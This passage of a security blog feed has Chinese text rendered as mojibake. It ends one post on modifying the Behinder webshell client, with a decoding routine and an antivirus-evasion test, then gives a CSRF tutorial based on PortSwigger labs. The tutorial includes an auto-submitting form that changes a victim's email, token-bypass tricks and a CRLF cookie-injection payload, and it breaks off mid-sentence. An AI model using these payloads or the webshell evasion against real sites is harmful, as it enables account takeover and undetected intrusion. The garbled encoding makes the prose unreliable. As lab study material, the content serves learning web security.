class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; baKeyword.length; i++)&#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            baKeyword[i] = (<span class="hljs-keyword">byte</span>)(<span class="hljs-number">0</span>xff &amp; Integer.parseInt(s.substring(i*<span class="hljs-number">2</span>, i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>),<span class="hljs-number">16</span>));<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>        &#125;<br>        <span class="hljs-keyword">try</span>&#123;<br>        s = <span class="hljs-keyword">new</span> String(baKeyword, <span class="hljs-string">&quot;utf-8&quot;</span>);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e1)&#123;<br>        e1.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> java.util.Base64.getDecoder().decode(s.replace(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>).replace(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>));<br><br>&#125;<br></code></pre></td></tr></table></figure><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_15-22.png" class="" title="2024-02-09_15-22.png"><h6 id="-17"><a href="#-17" class="headerlink" title=""></a></h6><p>æµ‹è¯•ä¸€ä¸‹æ•ˆæœ</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/2024-02-09_15-27.png" class="" title="2024-02-09_15-27.png"><h6 id="-18"><a href="#-18" class="headerlink" title=""></a></h6><p>æœ€ååšä¸€ä¸‹å…æ€æµ‹è¯•ï¼Œå› ä¸ºæˆ‘çš„winè™šæ‹Ÿæœºä¸Šå°±è£…äº†ä¸€ä¸ªç«ç»’ï¼Œå°±å…ˆåšç«ç»’çš„æµ‹è¯•å§ï¼Œå…¶ä»–è‡ªæµ‹å°±å¥½</p><img src="/2024/02/09/BehinderV4%E9%AD%94%E6%94%B9/688463846a03d520af12793620365b4.png" class="" title="688463846a03d520af12793620365b4.png">]]></content>
    
    
    <categories>
      
      <category>ç ”ç©¶æ—¥å¸¸</category>
      
    </categories>
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSRFæ€»ç»“</title>
    <link href="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/"/>
    <url>/2024/02/06/CSRF%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="CSRFä»‹ç»"><a href="#CSRFä»‹ç»" class="headerlink" title="CSRFä»‹ç»"></a>CSRFä»‹ç»</h2><p>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCross-site request forgeryï¼Œç®€ç§°CSRFï¼‰ï¼Œä¸€ç§å¸¸è§çš„webå®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…åˆ©ç”¨å—å®³è€…èº«ä»½å‘èµ·äº†HTTPè¯·æ±‚ï¼Œå¯¼è‡´å—å®³è€…åœ¨ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è¿›è¡Œäº†ä¸šåŠ¡æ“ä½œï¼›å®ƒå…è®¸æ”»å‡»è€…éƒ¨åˆ†è§„é¿åŒæºç­–ç•¥ï¼Œè¯¥ç­–ç•¥æ—¨åœ¨é˜²æ­¢ä¸åŒç½‘ç«™ç›¸äº’å¹²æ‰°ï¼Œå¹¶ä¸”ç”±äºæµè§ˆå™¨æ›¾ç»è®¤è¯è¿‡ï¼Œæ‰€ä»¥è¢«è®¿é—®çš„ç½‘ç«™ä¼šè®¤ä¸ºæ˜¯çœŸæ­£çš„ç”¨æˆ·æ“ä½œè€Œå»æ‰§è¡Œï¼Œç®€å•æ¥è¯´å°±æ˜¯ä½ ç‚¹å‡»æˆ‘æ„é€ çš„æ¶æ„é“¾æ¥ï¼Œæˆ‘å°±å¯ä»¥ä»¥ä½ çš„åä¹‰å»å‘èµ·ä¸€ä¸ªhttpè¯·æ±‚ã€‚å¸¸è§çš„æ¼æ´åˆ©ç”¨åœºæ™¯ï¼šä¿®æ”¹èµ„æ–™ã€æäº¤è®¢å•ã€å‘å¸ƒç•™è¨€æˆ–è¯„è®ºç­‰ï¼Œå¹¶ä¸”åœ¨Webåº”ç”¨ä¸­ï¼Œç”¨æˆ·ç™»å½•åæ‰§è¡Œçš„æ“ä½œä¸­æœ‰äº›å¤„ç†ä¸€æ—¦å®Œæˆå°±æ— æ³•æ’¤é”€ï¼Œæ¯”å¦‚ç”¨æˆ·ä½¿ç”¨ä¿¡ç”¨å¡æ”¯ä»˜ã€ä»ç”¨æˆ·çš„é“¶è¡Œè´¦å·è½¬è´¦ã€å‘é€é‚®ä»¶ã€æ›´æ”¹å¯†ç æˆ–é‚®ç®±åœ°å€ç­‰éƒ½æˆä¸ºäº†CSRFçš„å…¸å‹æ”»å‡»æ¡ˆä¾‹</p><h2 id="CSRFä¸»è¦çš„æ”»å‡»å½¢å¼"><a href="#CSRFä¸»è¦çš„æ”»å‡»å½¢å¼" class="headerlink" title="CSRFä¸»è¦çš„æ”»å‡»å½¢å¼"></a>CSRFä¸»è¦çš„æ”»å‡»å½¢å¼</h2><p>â‘  GETç±»å‹çš„CSRF</p><p>è¿™ç±»æ”»å‡»éå¸¸ç®€å•ï¼Œåªéœ€è¦æ„é€ ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œå³å¯å®Œæˆæ”»å‡»</p><p>â‘¡ POSTç±»å‹çš„CSRF<br>è¿™ç§ç±»å‹çš„ CSRF åˆ©ç”¨èµ·æ¥é€šå¸¸ä½¿ç”¨çš„æ˜¯ä¸€ä¸ªè‡ªåŠ¨æäº¤çš„è¡¨å•ï¼Œè®¿é—®é—®è¯¥é¡µé¢åï¼Œè¡¨å•ä¼šè‡ªåŠ¨æäº¤ï¼Œç›¸å½“äºæ¨¡æ‹Ÿç”¨æˆ·å®Œæˆäº†ä¸€æ¬¡ POST æ“ä½œã€‚å¯è§è¿™ç§ç±»å‹çš„ CSRF ä¸ç¬¬ä¸€ç§ä¸€æ ·ï¼Œéƒ½æ˜¯æ¨¡æ‹Ÿè¯·æ±‚ï¼Œæ‰€ä»¥åç«¯æ¥å£ä¹Ÿä¸èƒ½å°†å®‰å…¨å¯„æ‰˜åœ¨ä»…å…è®¸ POST è¯·æ±‚ä¸Š</p><p>â‘¢ é“¾æ¥ç±»å‹çš„ CSRF<br>é“¾æ¥ç±»å‹çš„CSRFå¹¶ä¸å¸¸è§ï¼Œæ¯”èµ·å…¶ä»–ä¸¤ç§ç”¨æˆ·æ‰“å¼€é¡µé¢å°±ä¸­æ‹›çš„æƒ…å†µï¼Œè¿™ç§ç±»å‹éœ€è¦ç”¨æˆ·ç‚¹å‡»é“¾æ¥æ‰ä¼šè§¦å‘ï¼Œä½†æœ¬è´¨ä¸Šä¸å‰ä¸¤ç§ä¸€æ ·ã€‚è¿™ç§ç±»å‹é€šå¸¸æ˜¯åœ¨è®ºå›å‘å¸ƒçš„å›¾ç‰‡ä¸­åµŒå…¥æ¶æ„é“¾æ¥ï¼Œæˆ–è€…ä»¥å¹¿å‘Šçš„å½¢å¼è¯±å¯¼ç”¨æˆ·ä¸­æ‹›ï¼Œæ”»å‡»è€…é€šå¸¸ä¼šä»¥æ¯”è¾ƒå¤¸å¼ çš„è¯è¯­è¯±éª—ç”¨æˆ·ç‚¹å‡»ï¼Œä¾‹å¦‚ï¼š&lt;a href&#x3D;â€ taget&#x3D;â€_blankâ€&gt; ç”±äºä¹‹å‰ç”¨æˆ·ç™»å½•äº†ä¿¡ä»»çš„ç½‘ç«™Aï¼Œå¹¶ä¸”ä¿å­˜ç™»å½•çŠ¶æ€ï¼Œåªè¦ç”¨æˆ·ä¸»åŠ¨è®¿é—®è¿™ä¸ªé¡µé¢ï¼Œåˆ™è¡¨ç¤ºæ”»å‡»æˆåŠŸ</p><h2 id="CSRFæ¼æ´åŸç†"><a href="#CSRFæ¼æ´åŸç†" class="headerlink" title="CSRFæ¼æ´åŸç†"></a>CSRFæ¼æ´åŸç†</h2><h3 id="CSRFæ¼æ´äº§ç”Ÿçš„åŸå› "><a href="#CSRFæ¼æ´äº§ç”Ÿçš„åŸå› " class="headerlink" title="CSRFæ¼æ´äº§ç”Ÿçš„åŸå› "></a>CSRFæ¼æ´äº§ç”Ÿçš„åŸå› </h3><p>(1)httpåè®®ä½¿ç”¨sessionåœ¨æœåŠ¡ç«¯ä¿å­˜ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯,å®¢æˆ·ç«¯æµè§ˆå™¨ç”¨cookieæ ‡è¯†ç”¨æˆ·èº«ä»½;</p><p>(2)cookieçš„è®¤è¯åªèƒ½ç¡®ä¿æ˜¯æŸä¸ªç”¨æˆ·å‘é€çš„è¯·æ±‚,ä½†æ˜¯ä¸èƒ½ä¿è¯è¿™ä¸ªè¯·æ±‚æ˜¯å¦æ˜¯â€ç”¨æˆ·è‡ªæ„¿çš„è¡Œä¸ºâ€.</p><p>(3)è¿™æ—¶,ç”¨æˆ·ç™»å½•äº†æŸä¸ªwebç«™ç‚¹,åŒæ—¶ç‚¹å‡»äº†åŒ…å«CSRFæ¶æ„ä»£ç çš„URL,å°±ä¼šè§¦å‘CSRF</p><h3 id="æ¼æ´åˆ©ç”¨çš„æ¡ä»¶"><a href="#æ¼æ´åˆ©ç”¨çš„æ¡ä»¶" class="headerlink" title="æ¼æ´åˆ©ç”¨çš„æ¡ä»¶"></a>æ¼æ´åˆ©ç”¨çš„æ¡ä»¶</h3><p>(1)ç”¨æˆ·å¿…é¡»ç™»å½•Aç½‘ç«™,ç”Ÿæˆäº†cookie</p><p>(2)ç™»å½•çš„åŒæ—¶è®¿é—®äº†æ¶æ„URL(åŒ…å«CSRFæ¶æ„ä»£ç çš„URL).</p><h3 id="åŸç†å›¾"><a href="#åŸç†å›¾" class="headerlink" title="åŸç†å›¾"></a>åŸç†å›¾</h3><p>ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹æˆ‘ä¸‹é¢åšçš„è¿™ä¸ªæµç¨‹å›¾</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/ae23ebf70d53939f7ed0052a3576698.png" class="" title="ae23ebf70d53939f7ed0052a3576698.png"><h6 id=""><a href="#" class="headerlink" title=""></a></h6><p>ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªå…è®¸ç”¨æˆ·æ›´æ”¹å…¶å¸æˆ·ä¸Šçš„ç”µå­é‚®ä»¶åœ°å€çš„åŠŸèƒ½ã€‚å½“ç”¨æˆ·æ‰§è¡Œæ­¤æ“ä½œæ—¶ï¼Œä»–ä»¬ä¼šå‘å‡ºå¦‚ä¸‹ä¸€ä¸ª HTTP è¯·æ±‚ï¼š</p><p>POST &#x2F;email&#x2F;change HTTP&#x2F;1.1<br>Host: vulnerable-website.com<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 30<br>Cookie: session&#x3D;yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</p><p>email&#x3D;<a href="mailto:&#x77;&#x69;&#101;&#x6e;&#101;&#114;&#64;&#x6e;&#111;&#x72;&#109;&#97;&#x6c;&#45;&#117;&#115;&#x65;&#114;&#46;&#99;&#111;&#109;">&#x77;&#x69;&#101;&#x6e;&#101;&#114;&#64;&#x6e;&#111;&#x72;&#109;&#97;&#x6c;&#45;&#117;&#115;&#x65;&#114;&#46;&#99;&#111;&#109;</a></p><p>è¿™æ»¡è¶³äº†CSRFæ‰€éœ€çš„æ¡ä»¶ï¼š<br>1ã€æ”»å‡»è€…é€šå¸¸èƒ½å¤Ÿè§¦å‘å¯†ç é‡ç½®å¹¶å®Œå…¨æ§åˆ¶ç”¨æˆ·çš„å¸æˆ·<br>2ã€åº”ç”¨ç¨‹åºä½¿ç”¨ä¼šè¯ cookie æ¥è¯†åˆ«å‘å‡ºè¯·æ±‚çš„ç”¨æˆ·<br>3ã€æ”»å‡»è€…å¯ä»¥è½»æ¾æ‰§è¡Œã€ä¿®æ”¹æ“ä½œæ‰€éœ€çš„è¯·æ±‚å‚æ•°çš„å€¼</p><p>å…·å¤‡è¿™äº›æ¡ä»¶åï¼Œæ”»å‡»è€…å°±å¯ä»¥æ„å»ºåŒ…å«ä»¥ä¸‹ HTML çš„ç½‘é¡µï¼š</p> <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">            <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><br><span class="language-javascript">        </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¦‚æœå—å®³è€…ç”¨æˆ·è®¿é—®æ”»å‡»è€…çš„ç½‘é¡µï¼Œå°†ä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š</p><p>æ”»å‡»è€…çš„é¡µé¢å°†è§¦å‘å¯¹æ˜“å—æ”»å‡»çš„ç½‘ç«™çš„ HTTP è¯·æ±‚ã€‚<br>å¦‚æœç”¨æˆ·ç™»å½•åˆ°æ˜“å—æ”»å‡»çš„ç½‘ç«™ï¼Œä»–ä»¬çš„æµè§ˆå™¨å°†è‡ªåŠ¨åœ¨è¯·æ±‚ä¸­åŒ…å«å…¶ä¼šè¯ cookie<br>å¹¶ä¸”è¯¥ç½‘ç«™å°†ä»¥æ­£å¸¸æ–¹å¼å¤„ç†è¯¥è¯·æ±‚ï¼Œè§†ä¸ºç”±å—å®³ç”¨æˆ·æ­£å¸¸å‘å‡ºï¼Œå´æˆåŠŸçš„æ›´æ”¹äº†ç”µå­é‚®ä»¶åœ°å€<br>SUCCCESSï¼</p><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://www.freebuf.com/articles/web/247866.html">https://www.freebuf.com/articles/web/247866.html</a><br><a href="https://developer.aliyun.com/article/1207187">https://developer.aliyun.com/article/1207187</a><br><a href="https://www.cnblogs.com/jingdongkeji/p/17799878.html">https://www.cnblogs.com/jingdongkeji/p/17799878.html</a></p><h2 id="CSRFæ¼æ´å¸¸è§åˆ©ç”¨æ–¹å¼"><a href="#CSRFæ¼æ´å¸¸è§åˆ©ç”¨æ–¹å¼" class="headerlink" title="CSRFæ¼æ´å¸¸è§åˆ©ç”¨æ–¹å¼"></a>CSRFæ¼æ´å¸¸è§åˆ©ç”¨æ–¹å¼</h2><p>ä¸‹é¢æˆ‘å°†ç”¨burpsuiteå®˜æ–¹é¶åœºç¯å¢ƒæ¥åšæ¼”ç¤º</p><h3 id="æ— é˜²å¾¡æªæ–½çš„CSRFæ¼æ´"><a href="#æ— é˜²å¾¡æªæ–½çš„CSRFæ¼æ´" class="headerlink" title="æ— é˜²å¾¡æªæ–½çš„CSRFæ¼æ´"></a>æ— é˜²å¾¡æªæ–½çš„CSRFæ¼æ´</h3><p>é¦–å…ˆä½¿ç”¨æä¾›çš„è´¦å·å¯†ç ç™»å½•å®éªŒå®¤ wiener:peter</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-22.png" class="" title="2024-02-05_20-22.png"><h6 id="-1"><a href="#-1" class="headerlink" title=""></a></h6><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶é»˜è®¤é‚®ç®±æ˜¯ <a href="mailto:&#119;&#x69;&#101;&#110;&#101;&#x72;&#64;&#x6e;&#111;&#114;&#109;&#x61;&#x6c;&#x2d;&#x75;&#x73;&#101;&#x72;&#x2e;&#x6e;&#101;&#x74;">&#119;&#x69;&#101;&#110;&#101;&#x72;&#64;&#x6e;&#111;&#114;&#109;&#x61;&#x6c;&#x2d;&#x75;&#x73;&#101;&#x72;&#x2e;&#x6e;&#101;&#x74;</a> ï¼Œæˆ‘ä»¬å…ˆéšä¾¿æ¨¡æ‹Ÿä¿®æ”¹é‚®ç®±è´¦å·ä¿®æ”¹ä¸€ä¸ªå¹¶æŠ“ä¸ªåŒ…</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-25.png" class="" title="2024-02-05_20-25.png"><h6 id="-2"><a href="#-2" class="headerlink" title=""></a></h6><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæ•°æ®åŒ…ä¸­åªæäº¤äº†ä¸€ä¸ªä¿®æ”¹åçš„é‚®ç®±æ•°æ®ï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨ burp è‡ªå¸¦çš„åŠŸèƒ½æ¥ç”Ÿæˆ POCï¼ŒæŠŠé‚®ç®±ä¿®æ”¹æˆæˆ‘ä»¬æƒ³è¦çš„æ”»å‡»æ•ˆæœï¼Œä¹Ÿå°±æ˜¯åªéœ€è¦ä¿®æ”¹ value ä¸­çš„å€¼å°±å¯ä»¥äº†</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-26_1.png" class="" title="2024-02-05_20-26_1.png"><h6 id="-3"><a href="#-3" class="headerlink" title=""></a></h6><p>ç„¶åå°†ç”Ÿæˆçš„æ”»å‡»é“¾æ¥ copy ä¸€ä¸‹ï¼Œç„¶ååœ¨åŒä¸€ä¸ªæµè§ˆå™¨æ‰“å¼€ï¼Œæ¥æ¨¡æ‹Ÿå—å®³è€…ç‚¹å‡»æˆ‘ä»¬ä¼ æ’­çš„ url å³å¯ï¼Œæ­¤æ—¶å¯ä»¥çœ‹åˆ°é‚®ç®±ä¿®æ”¹æˆåŠŸï¼Œåˆ™è¡¨ç¤ºæ”»å‡»æˆåŠŸ</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-28.png" class="" title="2024-02-05_20-28.png"><h6 id="-4"><a href="#-4" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_20-32.png" class="" title="2024-02-05_20-32.png"><h3 id="æœ‰é˜²æŠ¤çš„CSRFæ¼æ´ï¼ˆå¸¸è§ç»•è¿‡ï¼‰"><a href="#æœ‰é˜²æŠ¤çš„CSRFæ¼æ´ï¼ˆå¸¸è§ç»•è¿‡ï¼‰" class="headerlink" title="æœ‰é˜²æŠ¤çš„CSRFæ¼æ´ï¼ˆå¸¸è§ç»•è¿‡ï¼‰"></a>æœ‰é˜²æŠ¤çš„CSRFæ¼æ´ï¼ˆå¸¸è§ç»•è¿‡ï¼‰</h3><h4 id="æœªé™åˆ¶è¯·æ±‚æ–¹æ³•"><a href="#æœªé™åˆ¶è¯·æ±‚æ–¹æ³•" class="headerlink" title="æœªé™åˆ¶è¯·æ±‚æ–¹æ³•"></a>æœªé™åˆ¶è¯·æ±‚æ–¹æ³•</h4><p>è¿˜æ˜¯åˆšæ‰ä¿®æ”¹é‚®ç®±åœºæ™¯çš„é¶åœºç¯å¢ƒï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆæŠ“åŒ…çœ‹çœ‹æ•°æ®åŒ…ï¼Œåˆ†æä¸€ä¸‹ä¿®æ”¹é‚®ç®±æ€ä¹ˆå®ç°çš„</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-09.png" class="" title="2024-02-05_21-09.png"><h6 id="-5"><a href="#-5" class="headerlink" title=""></a></h6><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯å­˜åœ¨ä¸€ä¸ª CSRF token çš„ï¼Œæˆ‘ä»¬åˆ äº†å®ƒçœ‹çœ‹æ˜¯å¦ä¼šèµ°æ ¡éªŒ</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-11.png" class="" title="2024-02-05_21-11.png"><h6 id="-6"><a href="#-6" class="headerlink" title=""></a></h6><p>å¾ˆé—æ†¾ï¼Œçœ‹æ¥è¿™ä¸ªç‚¹è¿˜æ˜¯æœ‰ç”¨çš„ï¼Œå°è¯•ä¿®æ”¹è¯·æ±‚æ–¹æ³•ï¼Œçœ‹çœ‹è¿™é‡Œæˆ‘ä»¬èƒ½ä¸èƒ½ç”¨ get è¯·æ±‚æ¥ä¿®æ”¹é‚®ç®±å‘¢</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-17.png" class="" title="2024-02-05_21-17.png"><h6 id="-7"><a href="#-7" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-17_1.png" class="" title="2024-02-05_21-17_1.png"><h6 id="-8"><a href="#-8" class="headerlink" title=""></a></h6><p>è¯´æ˜ä¿®æ”¹è¯·æ±‚æ–¹æ³•æ˜¯æˆåŠŸçš„ï¼Œå¯ä»¥ç»•è¿‡ï¼Œæˆ‘ä»¬ç»§ç»­åˆ é™¤åé¢çš„csrfå‚æ•°ï¼Œå¤„ç†é€»è¾‘æœ‰æ²¡æœ‰å˜åŒ–ï¼Œåˆ é™¤åå‘ç°ä¹Ÿæ˜¯å¯ä»¥æˆåŠŸä¿®æ”¹çš„ï¼Œè¿™å°±è¯´æ˜å½“æˆ‘ä»¬çš„è¯·æ±‚æ–¹å¼æ”¹å˜ä¹‹åï¼Œè¿™ä¸ªcsrfå‚æ•°çš„æ ¡éªŒå°±å¤±æ•ˆäº†ï¼Œäºæ˜¯æˆ‘ä»¬å°±å¯ä»¥åˆ¶ä½œpocç”Ÿæˆæ¶æ„æ”»å‡»é“¾æ¥ï¼Œå¹¶è¯±å¯¼å—å®³è€…ç‚¹å‡»</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-22.png" class="" title="2024-02-05_21-22.png"><h6 id="-9"><a href="#-9" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-24.png" class="" title="2024-02-05_21-24.png"><h4 id="æœªæ ¡éªŒå‚æ•°æ˜¯å¦å­˜åœ¨"><a href="#æœªæ ¡éªŒå‚æ•°æ˜¯å¦å­˜åœ¨" class="headerlink" title="æœªæ ¡éªŒå‚æ•°æ˜¯å¦å­˜åœ¨"></a>æœªæ ¡éªŒå‚æ•°æ˜¯å¦å­˜åœ¨</h4><p>è¿™ç§æ¼æ´å‡ºç°çš„åŸå› å°±æ˜¯æ²¡æœ‰æ ¡éªŒå‚æ•°çš„å®Œæ•´æ€§ã€‚é€šè¿‡è§‚å¯Ÿæ•°æ®åŒ…ï¼Œå¦‚æœä¿®æ”¹å…³é”®å‚æ•°å¹¶ä¸”ä¸åšæ ¡éªŒï¼Œç›´æ¥åˆ¶ä½œpocç”Ÿæˆæ¶æ„æ”»å‡»é“¾æ¥å³å¯ï¼Œè¿™é‡Œå°±ä¸èµ˜è¿°äº†</p><h4 id="ä½¿ç”¨å…¬å…±çš„CSRF-tokenæ± "><a href="#ä½¿ç”¨å…¬å…±çš„CSRF-tokenæ± " class="headerlink" title="ä½¿ç”¨å…¬å…±çš„CSRF tokenæ± "></a>ä½¿ç”¨å…¬å…±çš„CSRF tokenæ± </h4><p>è¿™ç§æƒ…å†µæ˜¯ç”±äºè¿™ä¸ªåº”ç”¨æ²¡æœ‰å°†ä¸€ä¸ªç”¨æˆ·çš„ session å’Œä»–çš„ CSRF token è¿›è¡Œç»‘å®šï¼Œè€Œæ˜¯åšäº†ä¸€ä¸ªå…¬å…±çš„CSRF tokenæ± ï¼Œåªè¦æ˜¯è¿™ä¸ªæ± é‡Œçš„ tokenï¼Œéƒ½æ˜¯æœ‰æ•ˆçš„ï¼Œç»•è¿‡çš„æ€è·¯é‚£å°±æ˜¯ç›´æ¥è‡ªå·±ç™»å½•ä¸Šå»è·å–åˆ°ä¸€ä¸ª token å³å¯ç»•è¿‡</p><p>è¿™ä¸€æ¬¡éœ€è¦ä¸¤ä¸ªè´¦å· wiener å’Œ carlos æ¥è¿›è¡Œæ¼”ç¤º<br>é¦–å…ˆç™»é™† wiener å¹¶è§‚å¯Ÿæ•°æ®åŒ…ï¼Œè¯·æ±‚åŒ…è¿˜æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯å‘ç°é€šè¿‡ç”¨ä¸Šé¢çš„æ–¹å¼å·²ç»ç»•ä¸è¿‡å»äº†ã€‚è¿™é‡Œæˆ‘ä»¬å…ˆè®°å½•ä¸€ä¸‹wienerçš„tokenå€¼ï¼Œç„¶åç™»å‡º wiener ç™»å½• carlos åœ¨ä¿®æ”¹é‚®ç®±çš„æ—¶å€™æ›¿æ¢ CSRF çš„å€¼,å‘ç°ä¿®æ”¹æˆåŠŸï¼ŒæˆåŠŸç»•è¿‡</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-47.png" class="" title="2024-02-05_21-47.png"><h6 id="-10"><a href="#-10" class="headerlink" title=""></a></h6><p>è¿™å°±è¯´æ˜ï¼Œç”¨æˆ·æ¯æ¬¡ä¿®æ”¹é‚®ç®±çš„æ—¶å€™éœ€è¦ä¸€ä¸ªæœåŠ¡å™¨ä¸‹å‘çš„ä¸€æ¬¡æ€§ CSRF tokenï¼Œä½†è¿™ä¸ª token å¹¶æ²¡æœ‰ä¸ session ç»‘å®šï¼Œè€Œæ˜¯ä»å…¬å…±tokenæ± ä¸­æå–çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è‡ªå·±çš„è´¦å·æ¥è·å–ä¸€ä¸ªæœ‰æ•ˆçš„ CSRF token æ¥ç»•è¿‡è¿™ä¸ªæ ¡éªŒæœºåˆ¶ï¼Œåªä¸è¿‡æ¯æ¬¡æœ‰ç”¨æˆ·ä¸Šé’©ä¹‹åæˆ‘ä»¬éœ€è¦åˆ·æ–°è¿™ä¸ª token å€¼</p><h4 id="token-ç›´æ¥åœ¨-cookie-ä¸­è·å–"><a href="#token-ç›´æ¥åœ¨-cookie-ä¸­è·å–" class="headerlink" title="token ç›´æ¥åœ¨ cookie ä¸­è·å–"></a>token ç›´æ¥åœ¨ cookie ä¸­è·å–</h4><p>è¿™ç§æƒ…å†µä¸‹æƒ³è¦åˆ©ç”¨è¿˜éœ€è¦æœ‰ CRLF æ¼æ´æ¥é…åˆï¼Œæˆ–è€…æœ‰å…¶ä»–çš„å¯ä»¥æ³¨å…¥ cookie çš„æ¼æ´ï¼Œä½¿å¾—ä½ å¯ä»¥æ§åˆ¶ cookie çš„æ•°æ®è¿›è€Œæ§åˆ¶ csrf token çš„æ•°æ®</p><p>è¿™æ¬¡å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯èµ°äº†åŒå±‚éªŒè¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦ä¸€ä¸ªåœ°æ–¹æ¥æƒ³åŠæ³•æ³¨å…¥ set-cookieï¼Œé€šè¿‡æµ‹è¯•è¿™é‡Œçš„æœç´¢æ¡†å­˜åœ¨ CRLF æ¼æ´ï¼Œpayloadï¼š%0d%0aSet-Cookie:%20csrf&#x3D;123456%3b%20SameSite&#x3D;None</p><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_21-58.png" class="" title="2024-02-05_21-58.png"><h6 id="-11"><a href="#-11" class="headerlink" title=""></a></h6><img src="/2024/02/06/CSRF%E6%80%BB%E7%BB%93/2024-02-05_22-02.png" class="" title="2024-02-05_22-02.png"><h6 id="-12"><a href="#-12" class="headerlink" title=""></a></h6><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åœ¨è‡ªå·±çš„ä¸Šæ„é€ ä¸€ä¸ªå“åº”ï¼Œè®©å®ƒå»è¯·æ±‚åˆšæ‰å­˜åœ¨CRLFæ¼æ´ä¸Šçš„èµ„æºï¼Œç„¶åå‘èµ·ä¸€ä¸ªè¯·æ±‚æ¥å®ç° CRLF æ³¨å…¥ï¼Œä¹‹åå†å‘é€è¯·æ±‚å»ä¿®æ”¹é‚®ç®±å°±å¯ä»¥ï¼Œé¦–å…ˆè¿˜æ˜¯ç”¨burpsuiteå…ˆç”Ÿæˆä¸€ä¸ªcsrfçš„poc,ç„¶åå¯¹å…¶ä¿®æ”¹ï¼šåˆ©ç”¨ img æ ‡ç­¾å»è¯·æ±‚ 